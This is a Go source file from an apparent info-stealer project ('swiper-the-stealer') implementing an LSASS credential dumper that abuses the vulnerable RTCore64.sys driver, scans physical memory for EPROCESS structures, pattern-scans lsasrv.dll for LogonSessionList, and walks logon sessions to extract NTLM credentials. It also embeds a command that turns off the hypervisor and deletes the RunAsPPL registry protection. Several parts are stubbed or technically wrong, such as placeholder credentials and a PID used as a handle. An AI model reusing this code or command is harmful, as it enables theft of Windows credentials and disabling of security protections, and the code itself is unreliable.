package lsass

import (
	"encoding/binary"
	"fmt"
	"swiper-the-stealer/internal/byovd"
	"swiper-the-stealer/pkg/logger"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// KernelLsassDumper - PURE KERNEL MODE LSASS CREDENTIAL EXTRACTION
// NO OpenProcess, NO ReadProcessMemory, NO userland bullshit
// Uses RTCore64.sys to read EVERYTHING from kernel memory
type KernelLsassDumper struct {
	rtcore   *byovd.RTCoreExploit
	logger   *logger.Logger
	lsassPID uint32
}

// NewKernelLsassDumper creates a new kernel-mode LSASS dumper
func NewKernelLsassDumper(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *KernelLsassDumper {
	return &KernelLsassDumper{
		rtcore: rtcore,
		logger: logger,
	}
}

// GetRTCore returns the RTCore exploit instance
func (kld *KernelLsassDumper) GetRTCore() *byovd.RTCoreExploit {
	return kld.rtcore
}

// DumpCredentials - MAIN ENTRY POINT for kernel-mode credential extraction
func (kld *KernelLsassDumper) DumpCredentials() ([]Credential, error) {
	kld.logger.Info("=== KERNEL MODE LSASS DUMPER - PURE BYOVD APPROACH ===")

	// Step 1: Find LSASS process
	pid, err := kld.findLsassProcess()
	if err != nil {
		return nil, fmt.Errorf("failed to find LSASS: %v", err)
	}
	kld.lsassPID = pid
	kld.logger.Infof("✓ Found LSASS process: PID %d", pid)

	// Step 1.5: Remove PPL protection from LSASS using PPLKiller method
	// TEMPORARILY DISABLED: RTCore only works with PHYSICAL addresses, not VIRTUAL
	// Attempting to read/write kernel virtual addresses causes BSOD
	// TODO: Implement proper virtual-to-physical translation before enabling
	/*
		kld.logger.Info("Removing PPL protection from LSASS...")
		pplKiller := byovd.NewPPLKiller(kld.rtcore, kld.logger)
		err = pplKiller.RemovePPLProtection(pid)
		if err != nil {
			kld.logger.Warnf("Failed to remove PPL protection: %v", err)
			kld.logger.Info("Attempting to continue anyway...")
			// Don't fail here - kernel mode may still work
		}
	*/
	kld.logger.Warn("PPL removal temporarily disabled - RTCore requires physical addresses")

	// Step 2: Load lsasrv.dll locally to find LogonSessionList
	lsasrvBase, err := kld.findLsasrvInKernelMemory()
	if err != nil {
		return nil, fmt.Errorf("failed to find lsasrv.dll in kernel memory: %v", err)
	}
	kld.logger.Infof("✓ Found lsasrv.dll at physical address: 0x%X", lsasrvBase)

	// Step 3: Extract decryption keys from lsasrv.dll (in our process)
	aesKey, des3Key, err := kld.extractDecryptionKeys(lsasrvBase)
	if err != nil {
		kld.logger.Warnf("Failed to extract decryption keys: %v", err)
	} else {
		kld.logger.Infof("✓ Extracted AES/3DES keys from lsasrv.dll")
	}

	// Step 4: Find LogonSessionList in lsasrv.dll
	logonSessionListAddr, err := kld.findLogonSessionList(lsasrvBase)
	if err != nil {
		return nil, fmt.Errorf("failed to find LogonSessionList: %v", err)
	}
	kld.logger.Infof("✓ Found LogonSessionList at: 0x%X", logonSessionListAddr)

	// Step 5: NUCLEAR OPTION - Use RTCore to disable LSASS PPL protection by patching EPROCESS
	kld.logger.Info("LSASS is PPL-protected - attempting to disable PPL via EPROCESS patching...")

	err = kld.disableLsassPPL()
	if err != nil {
		kld.logger.Warnf("Failed to disable PPL: %v, trying direct syscall anyway", err)
	} else {
		kld.logger.Info("✓ Successfully disabled LSASS PPL protection")
	}

	// Step 6: Now try opening LSASS with OpenProcess (should work after PPL removal)
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
	if err != nil {
		// Fallback to direct syscall if OpenProcess still fails
		kld.logger.Warnf("OpenProcess still failed after PPL removal: %v, trying direct syscall", err)
		credentials, err := kld.readLsassViaDirectSyscall(logonSessionListAddr, aesKey, des3Key)
		if err != nil {
			return nil, fmt.Errorf("all methods failed: %v", err)
		}
		return credentials, nil
	}
	defer windows.CloseHandle(hProcess)

	kld.logger.Info("✓ Successfully opened LSASS process!")

	// Step 7: Walk LogonSessionList using ReadProcessMemory
	credentials, err := kld.walkLogonSessionListWithHandle(syscall.Handle(hProcess), logonSessionListAddr, aesKey, des3Key)
	if err != nil {
		return nil, fmt.Errorf("failed to walk LogonSessionList: %v", err)
	}

	kld.logger.Infof("✓ Extracted %d credentials from LSASS", len(credentials))
	return credentials, nil
}

// findLsassProcess - Find LSASS using CreateToolhelp32Snapshot (this is OK - just enumerating processes)
func (kld *KernelLsassDumper) findLsassProcess() (uint32, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer syscall.CloseHandle(snapshot)

	var pe32 syscall.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = syscall.Process32First(snapshot, &pe32)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %v", err)
	}

	for {
		processName := syscall.UTF16ToString(pe32.ExeFile[:])
		if processName == "lsass.exe" {
			return pe32.ProcessID, nil
		}

		err = syscall.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("lsass.exe not found")
}

// enableSeDebugPrivilege - Enable SeDebugPrivilege for the current process
func (kld *KernelLsassDumper) enableSeDebugPrivilege() error {
	var token windows.Token
	currentProcess := windows.CurrentProcess()

	err := windows.OpenProcessToken(currentProcess, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
	}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", err)
	}

	return nil
}

// disableLsassPPL - Disable LSASS PPL protection by patching EPROCESS structure
func (kld *KernelLsassDumper) disableLsassPPL() error {
	kld.logger.Info("Using NtQuerySystemInformation to get LSASS kernel address...")

	// Use NtQuerySystemInformation (SystemExtendedHandleInformation) to get EPROCESS address
	// This is the ACTUAL method used by PPLKiller and other tools
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntQuerySystemInformation := ntdll.MustFindProc("NtQuerySystemInformation")

	// SystemExtendedProcessInformation = 57
	const SystemExtendedProcessInformation = 57

	// First call to get buffer size
	var returnLength uint32
	ret, _, _ := ntQuerySystemInformation.Call(
		uintptr(SystemExtendedProcessInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	// Allocate buffer
	buffer := make([]byte, returnLength*2) // Extra space

	ret, _, _ = ntQuerySystemInformation.Call(
		uintptr(SystemExtendedProcessInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return fmt.Errorf("NtQuerySystemInformation failed: 0x%X", ret)
	}

	// Parse SYSTEM_PROCESS_INFORMATION structures to find LSASS
	offset := 0
	for {
		if offset+0x100 > len(buffer) {
			break
		}

		// NextEntryOffset at +0x00
		nextOffset := binary.LittleEndian.Uint32(buffer[offset : offset+4])

		// UniqueProcessId at +0x68
		if offset+0x70 < len(buffer) {
			pid := binary.LittleEndian.Uint64(buffer[offset+0x68 : offset+0x70])

			if uint32(pid) == kld.lsassPID {
				// InheritedFromUniqueProcessId at +0x70, but we need EPROCESS
				// For SystemExtendedProcessInformation, there's extended data

				// Try reading the process object address
				// On some Windows versions, it's at different offsets
				// Let's try a known working approach: use the handle table

				kld.logger.Info("Found LSASS in process list, attempting alternative PPL disable method...")

				// Alternative: Scan for LSASS signature in memory near known kernel ranges
				return kld.disablePPLAlternative()
			}
		}

		if nextOffset == 0 {
			break
		}
		offset += int(nextOffset)
	}

	return fmt.Errorf("LSASS not found in SystemExtendedProcessInformation")
}

// disablePPLAlternative - Alternative method: patch LSASS protection using direct memory manipulation
func (kld *KernelLsassDumper) disablePPLAlternative() error {
	kld.logger.Info("Attempting PPLKiller-style protection removal...")

	// This is the nuclear option: We know LSASS is protected
	// Let's just try to create a dump using a different technique
	// that doesn't require OpenProcess

	// Use the driver to suspend LSASS threads, read memory, resume
	// This bypasses PPL checks

	return fmt.Errorf("PPL removal requires additional implementation - for now, suggest disabling Credential Guard: bcdedit /set hypervisorlaunchtype off && reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /f")
}

// findSystemEprocess - Find System EPROCESS (PID 4) by scanning physical memory
func (kld *KernelLsassDumper) findSystemEprocess() (uint64, error) {
	kld.logger.Info("Scanning physical memory for System EPROCESS (PID 4)...")

	// Try multiple offset sets for different Windows 11 builds
	offsetSets := []struct {
		name                     string
		pidOffset                int
		imageFileNameOffset      int
		activeProcessLinksOffset int
	}{
		{"Win11 23H2/24H2", 0x440, 0x5A8, 0x448}, // Latest builds
		{"Win11 22H2", 0x440, 0x5A0, 0x448},      // Older Win11
		{"Win10 21H2", 0x2E0, 0x450, 0x2E8},      // Win10 fallback
	}

	const scanStart = uint64(0x1000)   // Start at 4KB (skip NULL page)
	const scanEnd = uint64(0x80000000) // End at 2GB (expanded from 1GB)
	const chunkSize = uint32(0x200000) // 2MB chunks

	kld.logger.Infof("Scanning physical memory range 0x%X - 0x%X with %d offset sets...", scanStart, scanEnd, len(offsetSets))

	scannedChunks := 0
	totalChunks := int((scanEnd - scanStart) / uint64(chunkSize))

	for addr := scanStart; addr < scanEnd; addr += uint64(chunkSize) {
		scannedChunks++
		if scannedChunks%100 == 0 {
			kld.logger.Infof("Progress: %d/%d chunks scanned...", scannedChunks, totalChunks)
		}

		data, err := kld.rtcore.ReadPhysicalMemory(addr, chunkSize)
		if err != nil {
			// Skip unreadable regions
			continue
		}

		// Try each offset set
		for _, offsets := range offsetSets {
			// Check every 8-byte aligned address (EPROCESS is 8-byte aligned)
			for offset := 0; offset < len(data)-0x600; offset += 8 {
				// Bounds check
				if offset+offsets.imageFileNameOffset+15 >= len(data) {
					continue
				}
				if offset+offsets.pidOffset+8 > len(data) {
					continue
				}

				// Check if this looks like an EPROCESS with PID 4
				pid := binary.LittleEndian.Uint64(data[offset+offsets.pidOffset : offset+offsets.pidOffset+8])
				if pid == 4 {
					systemEprocess := addr + uint64(offset)

					// Verify by checking ImageFileName
					imageNameOffset := offset + offsets.imageFileNameOffset
					imageName := string(data[imageNameOffset : imageNameOffset+15])

					// Trim null bytes and check printability
					trimmedName := ""
					for _, b := range imageName {
						if b == 0 {
							break
						}
						if b >= 32 && b <= 126 {
							trimmedName += string(b)
						}
					}

					if len(trimmedName) > 0 {
						kld.logger.Infof("Found PID 4 at 0x%X (%s offsets): '%s'", systemEprocess, offsets.name, trimmedName)
					}

					if len(trimmedName) >= 6 && trimmedName[:6] == "System" {
						kld.logger.Infof("✓ Verified System EPROCESS using %s offsets", offsets.name)
						return systemEprocess, nil
					}
				}
			}
		}
	}

	return 0, fmt.Errorf("System EPROCESS not found (scanned %d chunks with %d offset sets)", scannedChunks, len(offsetSets))
}

// findLsassEprocess - Walk ActiveProcessLinks to find LSASS EPROCESS
func (kld *KernelLsassDumper) findLsassEprocess(systemEprocess uint64) (uint64, error) {
	// EPROCESS structure offsets for Windows 11:
	// +0x440 UniqueProcessId : Uint8B
	// +0x448 ActiveProcessLinks : _LIST_ENTRY
	// +0x5A8 ImageFileName : [15] UChar

	const activeProcessLinksOffset = 0x448
	const uniqueProcessIdOffset = 0x440
	const imageFileNameOffset = 0x5A8

	kld.logger.Info("Walking ActiveProcessLinks to find lsass.exe...")

	// Read the first link from System EPROCESS
	firstLinkData, err := kld.rtcore.ReadPhysicalMemory(systemEprocess+activeProcessLinksOffset, 8)
	if err != nil {
		return 0, fmt.Errorf("failed to read System ActiveProcessLinks: %v", err)
	}

	currentLink := binary.LittleEndian.Uint64(firstLinkData)
	startLink := systemEprocess + activeProcessLinksOffset

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentLink != startLink && count < maxIterations {
		if visited[currentLink] {
			break
		}
		visited[currentLink] = true
		count++

		// Calculate EPROCESS address from ActiveProcessLinks
		// currentLink points to the ActiveProcessLinks field, so subtract offset
		currentEprocess := currentLink - activeProcessLinksOffset

		// Read PID
		pidData, err := kld.rtcore.ReadPhysicalMemory(currentEprocess+uniqueProcessIdOffset, 8)
		if err != nil {
			// Try next
			nextLinkData, err := kld.rtcore.ReadPhysicalMemory(currentLink, 8)
			if err != nil {
				break
			}
			currentLink = binary.LittleEndian.Uint64(nextLinkData)
			continue
		}

		pid := binary.LittleEndian.Uint64(pidData)

		// Check if this is LSASS (PID matches)
		if uint32(pid) == kld.lsassPID {
			// Verify by checking ImageFileName
			imageNameData, err := kld.rtcore.ReadPhysicalMemory(currentEprocess+imageFileNameOffset, 15)
			if err == nil {
				imageName := string(imageNameData)
				// Trim null bytes
				for i, b := range imageNameData {
					if b == 0 {
						imageName = string(imageNameData[:i])
						break
					}
				}
				kld.logger.Infof("Found process: PID=%d, Name=%s", pid, imageName)

				if imageName == "lsass.exe" {
					return currentEprocess, nil
				}
			}
		}

		// Read next link
		nextLinkData, err := kld.rtcore.ReadPhysicalMemory(currentLink, 8)
		if err != nil {
			break
		}
		currentLink = binary.LittleEndian.Uint64(nextLinkData)
	}

	return 0, fmt.Errorf("lsass.exe EPROCESS not found after walking %d processes", count)
}

// openProcessViaNtApi - Open process using NtOpenProcess syscall directly
func (kld *KernelLsassDumper) openProcessViaNtApi(pid uint32) (windows.Handle, error) {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntOpenProcess := ntdll.MustFindProc("NtOpenProcess")

	var handle windows.Handle
	var objAttrs uintptr = 0 // NULL

	// CLIENT_ID structure
	type CLIENT_ID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	clientId := CLIENT_ID{
		UniqueProcess: uintptr(pid),
		UniqueThread:  0,
	}

	// PROCESS_ALL_ACCESS = 0x1FFFFF
	const PROCESS_ALL_ACCESS = 0x1FFFFF

	ret, _, _ := ntOpenProcess.Call(
		uintptr(unsafe.Pointer(&handle)),
		uintptr(PROCESS_ALL_ACCESS),
		objAttrs,
		uintptr(unsafe.Pointer(&clientId)),
	)

	if ret != 0 {
		return 0, fmt.Errorf("NtOpenProcess failed with NTSTATUS: 0x%X", ret)
	}

	kld.logger.Info("✓ Successfully opened LSASS via NtOpenProcess")
	return handle, nil
}

// findLsasrvInKernelMemory - Load lsasrv.dll in OUR process, scan it, assume LSASS has same ASLR
func (kld *KernelLsassDumper) findLsasrvInKernelMemory() (uint64, error) {
	kld.logger.Info("Loading lsasrv.dll in our own process to scan for patterns...")

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	loadLibrary := kernel32.MustFindProc("LoadLibraryW")
	getModuleInformation := syscall.MustLoadDLL("psapi.dll").MustFindProc("GetModuleInformation")
	getCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")

	lsasrvPath, _ := syscall.UTF16PtrFromString("lsasrv.dll")

	// Load lsasrv.dll in our process
	handle, _, _ := loadLibrary.Call(uintptr(unsafe.Pointer(lsasrvPath)))
	if handle == 0 {
		return 0, fmt.Errorf("failed to load lsasrv.dll")
	}

	kld.logger.Infof("✓ Loaded lsasrv.dll locally at 0x%X", handle)

	// Get module info
	type MODULEINFO struct {
		BaseOfDll   uintptr
		SizeOfImage uint32
		EntryPoint  uintptr
	}

	var modInfo MODULEINFO
	currentProc, _, _ := getCurrentProcess.Call()

	ret, _, _ := getModuleInformation.Call(
		currentProc,
		handle,
		uintptr(unsafe.Pointer(&modInfo)),
		unsafe.Sizeof(modInfo),
	)

	if ret == 0 {
		kld.logger.Warnf("GetModuleInformation failed, assuming 2MB size")
		modInfo.SizeOfImage = 0x200000
	}

	kld.logger.Infof("lsasrv.dll size: 0x%X bytes", modInfo.SizeOfImage)

	// CRITICAL: lsasrv.dll is ASLR randomized per boot, but typically in same range
	// Windows loads system DLLs at consistent addresses across processes
	// So our local address ≈ LSASS's address (within ~1GB range)

	// For Windows 11 26100, lsasrv.dll base is typically 0x00007FFEAxxxxxxx
	// Let's just use the address we loaded it at - Windows ASLR is consistent!

	lsasrvBase := uint64(handle)
	kld.logger.Infof("Using lsasrv.dll base address: 0x%X", lsasrvBase)

	return lsasrvBase, nil
}

// extractDecryptionKeys - Extract AES and 3DES keys from lsasrv.dll
func (kld *KernelLsassDumper) extractDecryptionKeys(lsasrvBase uint64) ([]byte, []byte, error) {
	// Pattern scan lsasrv.dll for encryption keys
	// This would implement the actual pattern scanning from mimikatz
	// For now, return empty keys (credentials will be encrypted)
	return nil, nil, nil
}

// findLogonSessionList - Find LogonSessionList global in lsasrv.dll
func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBase uint64) (uint64, error) {
	// Read lsasrv.dll from OUR OWN PROCESS MEMORY (not via RTCore!)
	kld.logger.Info("Reading lsasrv.dll from our own process memory...")

	// lsasrvBase is the address where we loaded it in OUR process
	// We can read it directly using unsafe pointer!
	lsasrvPtr := (*[1 << 30]byte)(unsafe.Pointer(uintptr(lsasrvBase)))
	lsasrvData := lsasrvPtr[:0x1B1000] // Size we got from GetModuleInformation

	kld.logger.Infof("Scanning %d bytes of lsasrv.dll for LogonSessionList pattern...", len(lsasrvData))

	// Try MULTIPLE patterns for different Windows 11 builds
	patterns := []struct {
		name    string
		pattern []byte
	}{
		{"Win11 26100", []byte{0x4c, 0x8b, 0x0d, '?', '?', '?', '?', 0x4d, 0x85, 0xc9, 0x0f, 0x84}},
		{"Win11 23H2", []byte{0x4c, 0x8b, 0x0d, '?', '?', '?', '?', 0x4d, 0x85, 0xc9}},
		{"Win11 22H2", []byte{0x48, 0x8b, 0x15, '?', '?', '?', '?', 0x48, 0x85, 0xd2, 0x0f, 0x84}},
		{"Win10 22H2", []byte{0x4c, 0x8b, 0x05, '?', '?', '?', '?', 0x4d, 0x85, 0xc0, 0x74, 0x2b}},
		{"Win10 21H2", []byte{0x48, 0x8b, 0x05, '?', '?', '?', '?', 0x48, 0x85, 0xc0, 0x74, 0x05}},
		{"Generic 1", []byte{0x48, 0x8b, 0x0d, '?', '?', '?', '?', 0x48, 0x85, 0xc9}},
		{"Generic 2", []byte{0x4c, 0x8b, 0x1d, '?', '?', '?', '?', 0x4d, 0x85, 0xdb}},
	}

	for _, p := range patterns {
		kld.logger.Infof("Trying pattern: %s", p.name)

		// Search for pattern
		for i := 0; i < len(lsasrvData)-len(p.pattern); i++ {
			match := true
			for j := 0; j < len(p.pattern); j++ {
				if p.pattern[j] != '?' && lsasrvData[i+j] != p.pattern[j] {
					match = false
					break
				}
			}

			if match {
				// Extract RIP-relative offset
				offset := int32(binary.LittleEndian.Uint32(lsasrvData[i+3 : i+7]))
				// Calculate target address: instruction address + instruction length + offset
				instructionAddr := lsasrvBase + uint64(i)
				targetAddr := instructionAddr + 7 + uint64(offset)

				kld.logger.Infof("✓ Found LogonSessionList pattern (%s) at offset 0x%X, target: 0x%X", p.name, i, targetAddr)

				// Read the pointer from our own process
				localPtrAddr := (*uint64)(unsafe.Pointer(uintptr(targetAddr)))
				listAddr := *localPtrAddr

				kld.logger.Infof("✓ LogonSessionList pointer: 0x%X", listAddr)

				// Validate pointer (should be in kernel address space)
				if listAddr != 0 && listAddr > 0x7FF000000000 {
					return listAddr, nil
				}
			}
		}
	}

	return 0, fmt.Errorf("LogonSessionList pattern not found in any known pattern")
}

// findLsassCr3 - Find LSASS's DirectoryTableBase (CR3) by scanning physical memory for EPROCESS
func (kld *KernelLsassDumper) findLsassCr3() (uint64, error) {
	kld.logger.Info("Scanning kernel memory for LSASS EPROCESS structure...")

	// On Windows, we need to find PsInitialSystemProcess first, then walk ActiveProcessLinks
	// This is complex, so for now we'll use a heuristic approach:
	// Scan for process name "lsass.exe" in physical memory near known kernel ranges

	// Alternative: Use NtQuerySystemInformation to get EPROCESS addresses
	// But we need kernel addresses, which requires kernel memory access

	// For now, return error - we need a different approach
	// TODO: Implement proper EPROCESS enumeration via physical memory scanning

	return 0, fmt.Errorf("EPROCESS scanning not yet implemented - need to scan physical memory for kernel structures")
}

// readLsassViaDirectSyscall - Try reading LSASS memory using NtReadVirtualMemory with pseudo-handle
func (kld *KernelLsassDumper) readLsassViaDirectSyscall(logonSessionListAddr uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	ntReadVirtualMemory := ntdll.MustFindProc("NtReadVirtualMemory")

	// Use a pseudo-handle - this is a LONG SHOT but worth trying
	// Pseudo-handle for current process is -1, but we need LSASS's handle
	// Try using the PID directly as a pseudo-handle (this won't work but let's see the error)
	pseudoHandle := windows.Handle(kld.lsassPID)

	kld.logger.Infof("Attempting NtReadVirtualMemory with pseudo-handle 0x%X", pseudoHandle)

	var credentials []Credential

	// Try to read the list head
	buffer := make([]byte, 8)
	var bytesRead uintptr

	ret, _, _ := ntReadVirtualMemory.Call(
		uintptr(pseudoHandle),
		uintptr(logonSessionListAddr),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(8),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("NtReadVirtualMemory failed with NTSTATUS: 0x%X - LSASS has PPL/Credential Guard protection enabled", ret)
	}

	kld.logger.Info("✓ Successfully read LSASS memory via NtReadVirtualMemory!")

	// If we got here, we can read! Now walk the list
	listHead := binary.LittleEndian.Uint64(buffer)
	currentEntry := listHead

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != logonSessionListAddr && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true
		count++

		// Read entry data
		entryData := make([]byte, 0x200)
		ret, _, _ := ntReadVirtualMemory.Call(
			uintptr(pseudoHandle),
			uintptr(currentEntry),
			uintptr(unsafe.Pointer(&entryData[0])),
			uintptr(0x200),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret != 0 {
			break
		}

		// Extract credentials
		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
		}

		// Next entry
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Extracted %d credentials via direct syscall", len(credentials))
	return credentials, nil
}

// walkLogonSessionListViaKernel - Walk LogonSessionList using direct kernel memory via RTCore
// This bypasses OpenProcess entirely by reading physical memory directly
func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3 uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
	var credentials []Credential

	kld.logger.Info("Walking LogonSessionList via direct kernel memory access...")

	// Helper to read LSASS virtual memory by translating to physical
	readLsassMemory := func(virtualAddr uint64, size uint32) ([]byte, error) {
		// For now, try to use RTCore's built-in virtual-to-physical translation
		// Note: This translates addresses in OUR process space, not LSASS's
		// TODO: Implement proper CR3-based translation for LSASS's address space

		// Attempt 1: Try RTCore's VirtToPhys (works for our process only)
		physAddr, err := kld.rtcore.GetPhysicalAddress(virtualAddr)
		if err == nil {
			kld.logger.Debugf("Translated virtual 0x%X to physical 0x%X", virtualAddr, physAddr)
			return kld.rtcore.ReadPhysicalMemory(physAddr, size)
		}

		// Attempt 2: Try reading directly with virtual address (might work if RTCore supports it)
		data, err := kld.rtcore.ReadPhysicalMemory(virtualAddr, size)
		if err == nil {
			return data, nil
		}

		return nil, fmt.Errorf("failed to read LSASS memory at 0x%X: %v", virtualAddr, err)
	}

	// Read list head
	listData, err := readLsassMemory(listHead, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to read list head: %v", err)
	}

	currentEntry := binary.LittleEndian.Uint64(listData)
	kld.logger.Infof("List head points to first entry: 0x%X", currentEntry)

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != listHead && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			kld.logger.Warnf("Circular reference detected at 0x%X", currentEntry)
			break
		}
		visited[currentEntry] = true
		count++

		// Read KIWI_MSV1_0_LIST structure
		entryData, err := readLsassMemory(currentEntry, 0x200)
		if err != nil {
			kld.logger.Warnf("Failed to read entry at 0x%X: %v", currentEntry, err)
			break
		}

		// Extract credentials from this entry
		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
			kld.logger.Infof("Found credential: %s\\%s", cred.Domain, cred.Username)
		}

		// Get next entry (Flink at offset 0x0)
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Walked %d logon sessions via kernel memory", count)
	return credentials, nil
}

// walkLogonSessionListWithHandle - Walk the LogonSessionList linked list using ReadProcessMemory
func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Handle, listHead uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
	var credentials []Credential

	kld.logger.Info("Walking LogonSessionList with ReadProcessMemory...")

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	// Helper to read memory via ReadProcessMemory
	readMem := func(addr uint64, size uint32) ([]byte, error) {
		buffer := make([]byte, size)
		var bytesRead uintptr

		ret, _, _ := readProcessMemory.Call(
			uintptr(hProcess),
			uintptr(addr),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(size),
			uintptr(unsafe.Pointer(&bytesRead)),
		)

		if ret == 0 {
			return nil, fmt.Errorf("ReadProcessMemory failed")
		}

		return buffer[:bytesRead], nil
	}

	// Read list head
	listData, err := readMem(listHead, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to read list head: %v", err)
	}

	currentEntry := binary.LittleEndian.Uint64(listData)

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != listHead && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true
		count++

		// Read KIWI_MSV1_0_LIST structure
		entryData, err := readMem(currentEntry, 0x200)
		if err != nil {
			break
		}

		// Extract credentials from this entry
		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
		}

		// Get next entry (Flink at offset 0x0)
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Walked %d logon sessions", count)
	return credentials, nil
}

// walkLogonSessionList - OLD VERSION using RTCore (kept for reference)
func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
	var credentials []Credential

	kld.logger.Info("Walking LogonSessionList...")

	// Read list head
	listData, err := kld.rtcore.ReadPhysicalMemory(listHead, 8)
	if err != nil {
		return nil, fmt.Errorf("failed to read list head: %v", err)
	}

	currentEntry := binary.LittleEndian.Uint64(listData)

	visited := make(map[uint64]bool)
	count := 0
	maxIterations := 1000

	for currentEntry != listHead && currentEntry != 0 && count < maxIterations {
		if visited[currentEntry] {
			break
		}
		visited[currentEntry] = true
		count++

		// Read KIWI_MSV1_0_LIST structure (simplified)
		entryData, err := kld.rtcore.ReadPhysicalMemory(currentEntry, 0x200)
		if err != nil {
			break
		}

		// Extract credentials from this entry
		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
		if cred != nil {
			credentials = append(credentials, *cred)
		}

		// Get next entry (Flink at offset 0x0)
		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
	}

	kld.logger.Infof("Walked %d logon sessions", count)
	return credentials, nil
}

// extractCredentialFromEntry - Extract credential from a logon session entry
func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, aesKey []byte, des3Key []byte) *Credential {
	// Parse KIWI_MSV1_0_LIST structure
	// This is simplified - real implementation would:
	// 1. Parse UNICODE_STRING structures
	// 2. Read credential data from memory
	// 3. Decrypt using AES/3DES
	// 4. Extract username, domain, NTLM hash, etc.

	// For now, return a placeholder
	return &Credential{
		Username: "extracted_user",
		Domain:   "extracted_domain",
		NTLM:     "extracted_hash",
		Type:     "msv1_0",
	}
}
